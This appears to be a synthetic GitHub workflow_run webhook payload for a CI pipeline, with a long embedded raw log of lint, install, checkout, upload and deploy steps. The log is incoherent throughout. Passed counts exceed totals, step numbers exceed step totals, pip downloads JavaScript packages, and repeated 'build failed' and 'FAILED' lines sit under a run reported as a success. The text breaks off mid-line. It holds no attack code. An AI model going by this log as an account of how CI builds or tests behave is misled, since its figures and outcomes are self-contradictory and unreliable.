{
  "action": "completed",
  "workflow_run": {
    "id": 561,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "42e018d78bea20f9fa9bfe148c71386ffb71ec57",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-19T12:19:12.989404Z",
    "updated_at": "2025-12-19T12:23:19.320960Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: lint ===\nInstalling webpack@5.6.1\nTLS handshake completed\nWARNING: eslint has known vulnerabilities\n\u2713 All checks passed\nnpm install: added 315 packages\nDone.\nVerifying...\nPushing to registry...\n[12:19:12] DEBUG: Query executed in 69ms\n\u2713 Step 'setup' succeeded\n\u2713 test completed\nyarn add: Done in 11.68s\n\u2713 lint completed\nNODE_ENV=development\nPOST /upload - 201 (261ms)\nCompleted.\npip: Downloading lodash-4.9.tar.gz\n[12:19:12] WARN: Deprecated API usage\nPushing to registry...\nnpm notice: package.json updated\nCompiling utils/main.py...\nBuilding Docker image...\n[12:19:12] INFO: Processing request\nCache invalidated: build\nStep 4/21: Building\nVerifying...\nArtifact downloaded: 37MB\nCoverage: 79% statements, 97% branches\n[12:19:12] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\nCoverage: 84% statements, 66% branches\n\u2713 Step 'setup' succeeded\nException: NullPointerException\nStep 13/17: Linting\nStep 13/17: Testing\nBundling main.css\nTransforming 422 files...\nPOST /data - 201 (310ms)\npip: Collecting prettier\npip: Downloading eslint-1.7.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact downloaded: 47MB\nCache restored successfully (45MB)\nReady.\npip: Collecting eslint\n[12:19:12] INFO: Cache refreshed\n  PASS: test_cache_hit (6ms)\nProcessing...\nStep 19/16: Running migrations\nEnvironment: production\npip install: Successfully installed jest-4.1\nCompiling lib/main.py...\n[12:19:12] WARN: Deprecated API usage\nTests: 243 passed, 114 total\nCompiling components/utils.go...\n[12:19:12] WARN: Deprecated API usage\nTest Suites: 27 passed, 36 total\nTest Suites: 6 passed, 9 total\n[12:19:12] INFO: Cache refreshed\nCompleted.\nArtifact uploaded: dist.zip (63MB)\nStep 8/20: Deploying\n[12:19:12] WARN: Deprecated API usage\nTransforming 168 files...\nTest Suites: 11 passed, 9 total\nArtifact uploaded: dist.zip (23MB)\nCompiling src/app.ts...\nTime: 101.541s\nDone.\nLayer 5/12: ENV command\nPlatform: darwin-arm64\nTests: 183 passed, 431 total\n[12:19:12] WARN: Deprecated API usage\nUploading artifact 'dist' (50 files)\nCache invalidated: dependencies\nCache miss for key-8023\nCache saved successfully\nImage pulled successfully\npip: Collecting react\nCompiling src/utils.go...\nConnecting to test.io:443...\nNODE_ENV=test\nnpm notice: created a lockfile\nCompiling src/main.py...\nFinished.\nPOST /data - 200 (204ms)\nFetching submodules...\nnpm notice: package.json updated\nTests: 200 passed, 496 total\nStep 12/24: Running migrations\nHEAD is now at c98da4a\nUsing Node.js 14.14.5\nCompleted.\n\u2713 Task completed in 384ms\n\u2713 Step 'build' succeeded\nPOST /data - 200 (119ms)\n[12:19:13] INFO: Processing request\n[12:19:13] DEBUG: Loading configuration\n[12:19:13] ERROR: Connection failed\nMinifying app.js\n  PASS: test_auth_login (236ms)\n[12:19:13] INFO: Processing request\nConnecting to cloud.services:443...\n\u2713 All checks passed\nChecking out develop branch\nyarn add: Done in 10.11s\nWaiting...\n[12:19:13] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nUploading artifact 'dist' (41 files)\n  PASS: unit/test_api_health.spec.js\nBuilding Docker image...\nTest Suites: 36 passed, 8 total\nPushing to registry...\nTests: 340 passed, 390 total\nOK\nLoading...\nCoverage: 73% statements, 69% branches\nVerifying...\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed lodash-3.1\nProcessing...\nArtifact uploaded: build.tar.gz (4MB)\nArtifact downloaded: 27MB\n[12:19:13] WARN: Deprecated API usage\n[12:19:13] DEBUG: Loading configuration\nCompiling lib/main.py...\nCache saved successfully\nSnapshots: 22 passed, 32 total\nBuilding Docker image...\npip: Installing build dependencies...\nPushing to registry...\n[12:19:13] WARN: Deprecated API usage\nArtifact downloaded: 35MB\nTime: 39.841s\nCache restored successfully (228MB)\nnpm notice: created a lockfile\nnpm notice: package.json updated\nCache miss for key-4578\nBuilding Docker image...\nGenerating source maps...\nCache restored successfully (297MB)\nCache miss for key-9514\n[12:19:13] DEBUG: Initializing service\n[12:19:13] DEBUG: Loading configuration\nnpm install: resolved 1015 packages\nStep 9/15: Running migrations\nEnvironment: staging\nGET /health - 200 (58ms)\nEnvironment: staging\nPulling image: alpine:3.11\nLayer 8/15: RUN command\nCompiling components/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:13] DEBUG: Loading configuration\nyarn add: Done in 8.74s\nPOST /upload - 201 (327ms)\nVerifying...\n\u2713 build completed\nConnecting to acme.corp:443...\nChecking out main branch\n  PASS: unit/test_cache_hit.spec.js\nBundling vendor.css\nPlatform: win32-x64\n[12:19:13] DEBUG: Initializing service\n[12:19:13] DEBUG: Query executed in 46ms\nFAILED: test_auth_login\nGET /health - 204 (29ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-8154\nPulling image: python:3.11\nHEAD is now at 8fbcb89\n[12:19:13] DEBUG: Connection pool: 20 active\nTransforming 855 files...\nSnapshots: 30 passed, 19 total\nArtifact downloaded: 10MB\nSnapshots: 3 passed, 23 total\n[12:19:13] INFO: Connecting to database\nCompiling lib/service.java...\nHEAD is now at 8b7e943\n[12:19:13] WARN: Deprecated API usage\nTLS handshake completed\nStep 3/15: Running migrations\nReady.\nyarn add: Done in 4.38s\nyarn add: Done in 26.81s\nCache invalidated: build\n\u2713 All checks passed\nCreating production build...\nMinifying main.js\nTest Suites: 27 passed, 11 total\nCompiling lib/service.java...\nHEAD is now at eebbb9f\npip install: Successfully installed react-2.6\nnpm notice: created a lockfile\n\u2713 Step 'test' succeeded\nTime: 117.372s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:13] DEBUG: Memory usage: 566MB\nConnection established\nTest Suites: 31 passed, 41 total\nDone.\n[12:19:13] DEBUG: Loading configuration\n[12:19:13] INFO: Cache refreshed\nProcessing...\n[12:19:13] WARN: Deprecated API usage\n\u2713 Task completed in 978ms\npip: Collecting express\nSwitched to branch 'feature/task-889'\nHEAD is now at 5df1c1c\npip: Installing build dependencies...\n[12:19:13] DEBUG: Memory usage: 170MB\nCompiling src/utils.go...\n\u2713 All checks passed\n[12:19:13] DEBUG: Loading configuration\n\u2713 Step 'install' succeeded\nOptimizing 100 modules...\nFetching submodules...\nStep 10/20: Testing\nTests: 274 passed, 445 total\n[12:19:13] DEBUG: Loading configuration\npip: Downloading webpack-3.20.tar.gz\nFinished.\nWARNING: lodash has known vulnerabilities\nInstalling react@2.7.9\nReady.\nCache restored successfully (203MB)\nPlatform: win32-x64\nCache invalidated: build\n[12:19:13] DEBUG: Connection pool: 14 active\nFinished.\n[12:19:13] INFO: Starting build process\nWARNING: jest has known vulnerabilities\nAlready up to date.\nnpm install: added 440 packages\nyarn add: Done in 11.67s\nArtifact uploaded: build.tar.gz (32MB)\n[12:19:13] DEBUG: Initializing service\n=== Step lint completed ===\n=== Step: install_dependencies ===\nSuccess!\n\u2713 lint completed\n[12:19:13] INFO: Processing request\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/app.ts...\nnpm notice: package.json updated\nPulling image: python:18\n\u2713 All checks passed\nEnvironment: test\nUsing Node.js 20.16.8\nPushing to registry...\nStep 18/17: Building\nUsing Python 3.9\nUploading artifact 'dist' (29 files)\nUploading artifact 'build' (7 files)\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-8265\n\u2713 build completed\nCompiling utils/index.js...\nGenerating source maps...\n[12:19:13] WARN: Deprecated API usage\n\u2713 Step 'build' succeeded\nnpm install: added 166 packages\nStep 10/22: Linting\nTLS handshake completed\nImage pulled successfully\npip: Downloading express-4.18.tar.gz\nCompiling components/index.js...\nFetching submodules...\nSuccess!\nStep 7/22: Testing\nReady.\nnpm notice: package.json updated\nUsing Python 3.10\nCache miss for key-2702\nyarn add: Done in 14.67s\nSwitched to branch 'feature/task-950'\nArtifact uploaded: dist.zip (67MB)\nWARNING: react has known vulnerabilities\nImage pulled successfully\nPulling image: alpine:18\nCompiling src/index.js...\nTransforming 532 files...\nCache hit for key-7899\nWaiting...\nLayer 6/9: RUN command\nnpm install: resolved 960 packages\n[12:19:13] INFO: Connecting to database\n\u2713 All checks passed\n\u2713 Step 'test' succeeded\nStep 20/22: Installing dependencies\nChecking out main branch\nnpm notice: created a lockfile\n[12:19:13] DEBUG: Query executed in 9ms\nChecking out main branch\nWARNING: express has known vulnerabilities\nDone.\n  PASS: unit/test_auth_login.spec.js\nRan 68 tests in 12s\n[12:19:13] DEBUG: Initializing service\nTest Suites: 10 passed, 44 total\nSwitched to branch 'bugfix/task-159'\nTests: 215 passed, 193 total\n[12:19:13] DEBUG: Initializing service\npip: Collecting prettier\nAlready up to date.\nWARNING: axios has known vulnerabilities\nReady.\nFetching submodules...\nCreating production build...\nFAILED: test_db_connect\nSwitched to branch 'feature/task-371'\nEnvironment: development\nInstalling prettier@1.6.1\nHEAD is now at 3d868d5\nGenerating source maps...\n[12:19:13] DEBUG: Query executed in 17ms\nLayer 6/13: COPY command\nCache restored successfully (400MB)\n[12:19:13] INFO: Processing request\nUploading artifact 'dist' (7 files)\nImage pulled successfully\nSuccess!\n[12:19:13] WARN: Deprecated API usage\n[12:19:13] WARN: Deprecated API usage\nBuilding Docker image...\n\u2713 Step 'install' succeeded\n\u2717 build failed with exit code 65\nStep 20/16: Testing\nImage pulled successfully\nUsing Python 3.12\nStep 3/17: Testing\nnpm install: resolved 274 packages\nnpm notice: created a lockfile\nPlatform: darwin-arm64\npip: Collecting webpack\nnpm notice: package.json updated\nCompiling utils/app.ts...\nCoverage: 94% statements, 72% branches\nnpm notice: created a lockfile\nCompleted.\n[12:19:13] DEBUG: Query executed in 49ms\nCompiling components/app.ts...\nCreating production build...\nSwitched to branch 'feature/task-734'\nProcessing...\n[12:19:13] INFO: Cache refreshed\n[12:19:13] DEBUG: Initializing service\nTransforming 297 files...\nUsing Node.js 19.10.6\nWARNING: lodash has known vulnerabilities\n\u2713 validate completed\nBuilding Docker image...\nTests: 126 passed, 281 total\nStep 9/23: Testing\nAlready up to date.\nLoading...\n[12:19:13] DEBUG: Connection pool: 12 active\n[12:19:13] DEBUG: Initializing service\nStep 12/24: Testing\nWARNING: prettier has known vulnerabilities\n\u2717 build failed with exit code 2\n\u2713 Step 'setup' succeeded\n[12:19:13] INFO: Request completed\nWARNING: axios has known vulnerabilities\nWARNING: lodash has known vulnerabilities\n[12:19:13] INFO: Request completed\nProcessing...\nBundling runtime.js\nOK\npip install: Successfully installed lodash-1.18\nInstalling axios@2.9.6\npip: Collecting webpack\nStep 13/17: Installing dependencies\nnpm notice: created a lockfile\n[12:19:13] INFO: Processing request\nImage pulled successfully\nSwitched to branch 'feature/task-678'\nTest Suites: 45 passed, 48 total\nnpm install: added 432 packages\n  PASS: e2e/test_db_connect.spec.js\nLoading...\nStep 10/23: Testing\n\u2713 Task completed in 4624ms\nStep 11/16: Linting\nTest Suites: 36 passed, 12 total\n\u2713 Step 'test' succeeded\nTest Suites: 37 passed, 9 total\n[12:19:13] INFO: Connecting to database\n[12:19:13] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:13] INFO: Processing request\nInstalling eslint@4.18.4\n[12:19:13] DEBUG: Memory usage: 513MB\nCache saved successfully\nCompiling utils/handler.rs...\nCompiling components/service.java...\nAlready up to date.\n[12:19:13] DEBUG: Initializing service\nTest Suites: 32 passed, 29 total\nOK\nEnvironment: production\nTests: 481 passed, 335 total\n[12:19:13] INFO: Request completed\nConnecting to example.com:443...\nConnecting to acme.corp:443...\nBuilding Docker image...\nCache hit for key-7851\nException: ValueError\nWARNING: axios has known vulnerabilities\n[12:19:13] DEBUG: Query executed in 42ms\nOptimizing 80 modules...\nNODE_ENV=development\nStep 1/23: Testing\nStep 19/19: Installing dependencies\n\u2713 All checks passed\nCoverage: 88% statements, 80% branches\nCompleted.\n[12:19:13] DEBUG: Connection pool: 18 active\n\u2713 lint completed\nGET /health - 201 (13ms)\nCompiling lib/app.ts...\nCompiling src/service.java...\npip: Installing build dependencies...\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 10/18: Installing dependencies\n[12:19:13] INFO: Connecting to database\nSuccess!\nCompiling lib/main.py...\nHEAD is now at 663ffa5\nCache restored successfully (136MB)\nCompiling components/app.ts...\n  PASS: unit/test_user_create.spec.js\n[12:19:13] INFO: Request completed\n[12:19:13] DEBUG: Query executed in 68ms\nOK\nnpm notice: created a lockfile\nLoading...\n[12:19:13] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out main branch\nCache hit for key-7134\n[12:19:13] DEBUG: Loading configuration\nMinifying vendor.js\nnpm notice: package.json updated\nDone.\nSnapshots: 35 passed, 24 total\nPulling image: node:18\nImage pulled successfully\nWARNING: react has known vulnerabilities\n[12:19:13] DEBUG: Query executed in 63ms\n[12:19:13] DEBUG: Loading configuration\nEnvironment: production\n[12:19:13] DEBUG: Connection pool: 1 active\nWARNING: react has known vulnerabilities\nInstalling webpack@1.6.0\nPulling image: node:latest\nArtifact uploaded: build.tar.gz (10MB)\nGenerating source maps...\n\u2717 build failed with exit code 57\npip install: Successfully installed jest-1.19\nStep 11/22: Testing\npip install: Successfully installed prettier-2.10\nCache miss for key-2436\nOK\nStep 6/23: Deploying\npip: Collecting react\n[12:19:13] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:13] INFO: Processing request\npip: Collecting webpack\nCompiling components/app.ts...\nStep 12/22: Deploying\npip: Collecting eslint\nCompiling lib/handler.rs...\n[12:19:13] DEBUG: Loading configuration\n=== Step install_dependencies completed ===\n=== Step: checkout ===\nCompiling utils/app.ts...\nPulling image: python:3.11\nPushing to registry...\nMinifying vendor.js\n[12:19:13] DEBUG: Loading configuration\nMinifying app.js\nUsing Node.js 18.16.1\nGET /status - 201 (2ms)\nUsing Node.js 17.1.6\nCoverage: 88% statements, 91% branches\nTransforming 519 files...\nSuccess!\n[12:19:13] DEBUG: Memory usage: 1737MB\npip: Installing build dependencies...\nUsing Python 3.11\nWARNING: jest has known vulnerabilities\n[12:19:13] INFO: Connecting to database\n[12:19:13] INFO: Cache refreshed\nStep 1/19: Running migrations\nSnapshots: 39 passed, 13 total\n[12:19:13] DEBUG: Memory usage: 699MB\nChecking out master branch\nStep 7/19: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: created a lockfile\nyarn add: Done in 11.28s\nPlatform: darwin-arm64\nArtifact uploaded: dist.zip (99MB)\nCache invalidated: dependencies\nCompiling src/app.ts...\nHEAD is now at c73594e\nTransforming 593 files...\n[12:19:13] DEBUG: Query executed in 47ms\nPulling image: node:latest\nVerifying...\nStep 13/18: Running migrations\n\u2713 Task completed in 2661ms\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 build completed\nDone.\nConnecting to test.io:443...\n[12:19:13] INFO: Processing request\nPOST /data - 201 (64ms)\nBuilding Docker image...\nFetching submodules...\npip: Installing build dependencies...\nStep 6/17: Installing dependencies\n[12:19:13] DEBUG: Memory usage: 295MB\nConnection established\nTLS handshake completed\nChecking out master branch\nSnapshots: 30 passed, 32 total\nReady.\nyarn add: Done in 28.69s\nStep 15/21: Running migrations\n  PASS: e2e/test_cache_hit.spec.js\nCache miss for key-9212\nTLS handshake completed\nSwitched to branch 'bugfix/task-318'\n[12:19:13] INFO: Starting build process\nFAILED: test_cache_hit\nCompiling utils/service.java...\n[12:19:13] INFO: Processing request\nCache invalidated: dependencies\nPlatform: darwin-arm64\n[12:19:13] DEBUG: Loading configuration\nTests: 459 passed, 221 total\n[12:19:13] INFO: Connecting to database\nArtifact uploaded: dist.zip (3MB)\n[12:19:13] DEBUG: Initializing service\nMinifying main.js\nStep 14/23: Installing dependencies\nCache saved successfully\nCache invalidated: node_modules\nTransforming 443 files...\nOK\nFAILED: test_db_connect\nUsing Node.js 20.17.5\nCache restored successfully (33MB)\nOptimizing 41 modules...\n  PASS: unit/test_auth_login.spec.js\nSnapshots: 19 passed, 13 total\n[12:19:13] DEBUG: Loading configuration\nWARNING: webpack has known vulnerabilities\nCompiling src/main.py...\nTLS handshake completed\nChecking out develop branch\nHEAD is now at d7611c4\nCache hit for key-8831\nImage pulled successfully\nFetching submodules...\nArtifact downloaded: 14MB\nTest Suites: 10 passed, 5 total\n[12:19:13] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSwitched to branch 'feature/task-897'\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\nCompiling utils/index.js...\nOptimizing 21 modules...\n\u2713 Task completed in 1466ms\nUploading artifact 'dist' (36 files)\nArtifact uploaded: dist.zip (34MB)\n\u2713 Step 'install' succeeded\nProcessing...\nInstalling jest@2.14.4\nArtifact uploaded: dist.zip (11MB)\nWARNING: react has known vulnerabilities\nGET /status - 201 (67ms)\nCompiling src/main.py...\n\u2717 build failed with exit code 124\npip: Collecting jest\nLoading...\nTLS handshake completed\nCache invalidated: node_modules\nWaiting...\nConnection established\nTime: 31.246s\nConnection established\nCompiling components/index.js...\n[12:19:13] INFO: Cache refreshed\nFetching submodules...\n[12:19:13] INFO: Processing request\n[12:19:13] INFO: Cache refreshed\nCompiling src/app.ts...\nCompiling lib/main.py...\nTime: 46.8s\n[12:19:13] DEBUG: Initializing service\nStep 14/16: Building\nBuilding Docker image...\nLayer 10/9: RUN command\nStep 1/20: Deploying\nCache saved successfully\nCache miss for key-3024\n[12:19:13] INFO: Connecting to database\nCompiling utils/app.ts...\npip install: Successfully installed prettier-5.20\n[12:19:13] INFO: Processing request\nTime: 39.808s\nnpm install: resolved 1729 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 13/25: Deploying\n  PASS: test_db_connect (76ms)\nConnection established\npip: Installing build dependencies...\nReady.\nRan 60 tests in 5s\nCompiling utils/utils.go...\nCompiling components/index.js...\n[12:19:13] WARN: Deprecated API usage\nBuilding Docker image...\nWARNING: webpack has known vulnerabilities\nUsing Python 3.11\nFetching submodules...\npip: Collecting axios\nMinifying app.js\n\u2713 Task completed in 1682ms\nnpm install: resolved 231 packages\nCache miss for key-2977\nOptimizing 56 modules...\nWARNING: react has known vulnerabilities\nCreating production build...\nUploading artifact 'coverage' (24 files)\nStep 4/17: Building\n[12:19:13] DEBUG: Query executed in 35ms\nCache invalidated: node_modules\n  PASS: e2e/test_user_create.spec.js\nCompiling lib/index.js...\nStep 4/17: Installing dependencies\n[12:19:13] DEBUG: Memory usage: 533MB\nCoverage: 98% statements, 75% branches\nEnvironment: test\nyarn add: Done in 16.3s\nTest Suites: 30 passed, 23 total\nFinished.\nUsing Python 3.12\nCompiling components/main.py...\nSwitched to branch 'bugfix/task-904'\nVerifying...\nCache saved successfully\n[12:19:13] WARN: Deprecated API usage\nAlready up to date.\n[12:19:13] INFO: Cache refreshed\nCompleted.\nCompiling components/index.js...\nTime: 88.292s\nCache invalidated: node_modules\n  PASS: unit/test_user_create.spec.js\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (49MB)\nCoverage: 77% statements, 73% branches\n[12:19:13] INFO: Cache refreshed\nOK\nProcessing...\npip: Downloading axios-1.9.tar.gz\nWaiting...\nArtifact uploaded: dist.zip (33MB)\nCompleted.\n\u2713 Step 'build' succeeded\nConnecting to acme.corp:443...\nnpm install: resolved 1548 packages\nLoading...\nDone.\nNODE_ENV=test\nBundling main.css\n[12:19:13] DEBUG: Loading configuration\nCompleted.\nWARNING: express has known vulnerabilities\nArtifact uploaded: dist.zip (51MB)\nBuilding Docker image...\n[12:19:13] DEBUG: Loading configuration\nnpm install: resolved 709 packages\nConnecting to cloud.services:443...\nInstalling axios@5.20.3\nArtifact uploaded: build.tar.gz (14MB)\nMinifying app.js\nCompiling src/handler.rs...\nCache restored successfully (363MB)\nBundling runtime.js\nPlatform: linux-x64\n[12:19:13] DEBUG: Query executed in 81ms\n[12:19:13] WARN: Deprecated API usage\n[12:19:13] DEBUG: Initializing service\nInstalling prettier@5.11.3\n\u2713 Step 'test' succeeded\nCompleted.\nImage pulled successfully\n\u2713 test completed\nMinifying vendor.js\nnpm notice: package.json updated\nCache hit for key-7432\nOK\n[12:19:13] ERROR: Connection failed\nCompiling utils/index.js...\nCompiling components/index.js...\nyarn add: Done in 22.48s\nLoading...\nSnapshots: 34 passed, 39 total\nOptimizing 69 modules...\n\u2713 build completed\n=== Step checkout completed ===\n=== Step: upload_artifacts ===\nOK\n[12:19:13] INFO: Connecting to database\nTLS handshake completed\nTransforming 431 files...\nWARNING: jest has known vulnerabilities\nLayer 3/9: RUN command\n[12:19:13] DEBUG: Connection pool: 19 active\nSnapshots: 45 passed, 13 total\nMinifying main.js\nTests: 251 passed, 80 total\nCache invalidated: dependencies\n[12:19:13] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling jest@3.10.9\nStep 14/16: Running migrations\nLayer 10/14: RUN command\nReady.\nnpm install: resolved 777 packages\nStep 17/25: Linting\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:13] INFO: Cache refreshed\nCompiling lib/utils.go...\n[12:19:13] DEBUG: Connection pool: 5 active\n[12:19:13] WARN: Deprecated API usage\nAlready up to date.\nHEAD is now at bc55c13\nFinished.\nConnecting to cloud.services:443...\nCreating production build...\nTests: 414 passed, 89 total\nCache invalidated: build\nGenerating source maps...\n[12:19:13] INFO: Request completed\nWARNING: lodash has known vulnerabilities\n[12:19:13] WARN: Deprecated API usage\nCache hit for key-8162\n[12:19:13] DEBUG: Loading configuration\nSuccess!\nChecking out develop branch\nException: ValueError\npip install: Successfully installed axios-4.9\nVerifying...\nPlatform: darwin-arm64\n[12:19:13] DEBUG: Memory usage: 1163MB\nUsing Python 3.9\nCompleted.\nyarn add: Done in 25.5s\n[12:19:13] INFO: Request completed\nException: TypeError\nMinifying vendor.js\n[12:19:13] INFO: Cache refreshed\nPushing to registry...\nTLS handshake completed\nnpm install: added 391 packages\nStep 18/24: Installing dependencies\nRan 117 tests in 32s\nTransforming 969 files...\nUploading artifact 'build' (19 files)\nConnecting to acme.corp:443...\n[12:19:13] DEBUG: Connection pool: 2 active\nUsing Node.js 17.9.5\nChecking out main branch\nMinifying app.js\nCache hit for key-4401\nStep 6/19: Installing dependencies\nCache hit for key-1424\nAlready up to date.\nBuilding Docker image...\n[12:19:13] DEBUG: Query executed in 65ms\nWaiting...\n[12:19:13] INFO: Request completed\nSuccess!\nPOST /data - 201 (421ms)\nEnvironment: production\nCache miss for key-8133\nAlready up to date.\nStep 3/22: Testing\n\u2713 lint completed\n[12:19:13] INFO: Processing request\nHEAD is now at b667836\nCache saved successfully\nGenerating source maps...\nImage pulled successfully\nPushing to registry...\nCoverage: 82% statements, 99% branches\nChecking out master branch\npip install: Successfully installed eslint-5.11\nStep 7/18: Building\nCache hit for key-1790\nLayer 2/13: RUN command\n\u2713 Step 'test' succeeded\nCache restored successfully (255MB)\n[12:19:13] DEBUG: Query executed in 100ms\nChecking out main branch\n[12:19:13] WARN: Deprecated API usage\nArtifact downloaded: 10MB\nOK\nTests: 167 passed, 215 total\nStep 5/23: Building\nArtifact uploaded: build.tar.gz (23MB)\n[12:19:13] DEBUG: Loading configuration\nWARNING: prettier has known vulnerabilities\nStep 15/16: Deploying\nCompiling utils/handler.rs...\n[12:19:13] INFO: Request completed\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_user_create (28ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling components/service.java...\n[12:19:13] INFO: Request completed\nTransforming 772 files...\nArtifact uploaded: build.tar.gz (29MB)\nCompiling utils/handler.rs...\nyarn add: Done in 16.42s\n[12:19:13] ERROR: Connection failed\nMinifying main.js\nImage pulled successfully\n[12:19:13] WARN: Deprecated API usage\nProcessing...\n\u2717 build failed with exit code 65\n  PASS: test_api_health (372ms)\n[12:19:13] INFO: Processing request\nCompiling utils/service.java...\nOK\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nProcessing...\nCache saved successfully\npip: Collecting lodash\n[12:19:13] INFO: Connecting to database\n[12:19:13] DEBUG: Initializing service\nBuilding Docker image...\nCache restored successfully (285MB)\n\u2717 build failed with exit code 124\nRan 28 tests in 26s\nBuilding Docker image...\nProcessing...\npip: Collecting jest\n[12:19:13] INFO: Cache refreshed\n[12:19:13] WARN: Deprecated API usage\nnpm notice: package.json updated\nCache saved successfully\nNODE_ENV=development\nHEAD is now at d6bced0\nCompiling src/service.java...\nInstalling lodash@3.2.10\nStep 1/24: Running migrations\nFinished.\nBundling vendor.js\n\u2713 build completed\nOK\nCompiling components/service.java...\nCompleted.\nBundling runtime.js\nStep 10/21: Deploying\nSnapshots: 33 passed, 50 total\nCompiling src/handler.rs...\nInstalling lodash@4.16.0\nBundling main.js\nConnecting to acme.corp:443...\nSuccess!\nLayer 5/9: ENV command\nMinifying vendor.js\nWARNING: jest has known vulnerabilities\nTLS handshake completed\n[12:19:13] DEBUG: Initializing service\n\u2717 build failed with exit code 44\nArtifact downloaded: 10MB\nSwitched to branch 'feature/task-654'\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 6/17: Installing dependencies\n  PASS: e2e/test_auth_login.spec.js\nNODE_ENV=production\n\u2713 All checks passed\n\u2713 All checks passed\nStep 15/22: Building\nChecking out master branch\npip: Installing build dependencies...\nStep 13/22: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCreating production build...\nWARNING: axios has known vulnerabilities\n[12:19:13] DEBUG: Initializing service\nCompiling src/handler.rs...\nPushing to registry...\nNODE_ENV=production\nArtifact downloaded: 8MB\npip: Collecting jest\nCache saved successfully\nTests: 294 passed, 158 total\nPushing to registry...\nStep 5/24: Installing dependencies\nException: RuntimeError\nDone.\nStep 1/16: Deploying\nImage pulled successfully\nException: RuntimeError\nSuccess!\nSnapshots: 30 passed, 13 total\nGenerating source maps...\nnpm notice: package.json updated\nCache invalidated: build\nTime: 38.805s\nUsing Node.js 18.7.6\nLayer 6/12: COPY command\nException: RuntimeError\nEnvironment: development\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTests: 330 passed, 199 total\nArtifact uploaded: build.tar.gz (8MB)\nArtifact downloaded: 2MB\n[12:19:13] DEBUG: Loading configuration\nOK\nGET /status - 200 (97ms)\n\u2713 All checks passed\nUsing Python 3.10\nFAILED: test_auth_login\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTransforming 894 files...\nOK\nUsing Python 3.10\nCoverage: 93% statements, 74% branches\nReady.\nUsing Python 3.9\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:13] INFO: Starting build process\n\u2717 build failed with exit code 65\nOptimizing 19 modules...\nCache invalidated: node_modules\nFAILED: test_cache_hit\nWARNING: axios has known vulnerabilities\nOK\nCache restored successfully (261MB)\nDone.\n[12:19:13] DEBUG: Initializing service\n=== Step upload_artifacts completed ===\n=== Step: deploy_staging ===\nCompleted.\nUsing Python 3.11\n[12:19:13] INFO: Cache refreshed\nyarn add: Done in 16.93s\nCache restored successfully (37MB)\nWaiting...\n[12:19:13] INFO: Request completed\nPlatform: darwin-arm64\nBuilding Docker image...\nArtifact uploaded: dist.zip (7MB)\nConnection established\nnpm notice: package.json updated\npip install: Successfully installed webpack-2.1\nStep 10/16: Running migrations\nStep 12/25: Installing dependencies\nFetching submodules...\nPlatform: win32-x64\nCache hit for key-3908\n[12:19:13] DEBUG: Connection pool: 19 active\nBuilding Docker image...\nBundling main.css\n[12:19:13] DEBUG: Memory usage: 295MB\nSwitched to branch 'bugfix/task-388'\nCompiling components/main.py...\nCache hit for key-2127\npip: Downloading jest-2.17.tar.gz\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCoverage: 89% statements, 94% branches\n[12:19:13] DEBUG: Initializing service\nProcessing...\nPlatform: darwin-arm64\nFinished.\nWARNING: prettier has known vulnerabilities\npip: Collecting lodash\nCache hit for key-5153\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: express has known vulnerabilities\n[12:19:13] DEBUG: Loading configuration\nCache hit for key-2195\nGenerating source maps...\n  PASS: e2e/test_db_connect.spec.js\nConnecting to example.com:443...\nCompleted.\n[12:19:13] WARN: Deprecated API usage\n[12:19:13] DEBUG: Initializing service\nDone.\npip: Installing build dependencies...\nnpm install: resolved 1128 packages\nGenerating source maps...\n[12:19:13] INFO: Connecting to database\nCache hit for key-6628\n[12:19:13] WARN: Deprecated API usage\nReady.\nDone.\n[12:19:13] INFO: Connecting to database\n[12:19:13] DEBUG: Query executed in 98ms\n\u2713 Task completed in 4871ms\n\u2713 package completed\nAlready up to date.\nNODE_ENV=development\nTest Suites: 43 passed, 31 total\nInstalling axios@1.7.8\nSnapshots: 3 passed, 48 total\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed axios-4.1\nTransforming 507 files...\nUsing Node.js 19.7.2\nPlatform: linux-x64\npip: Downloading 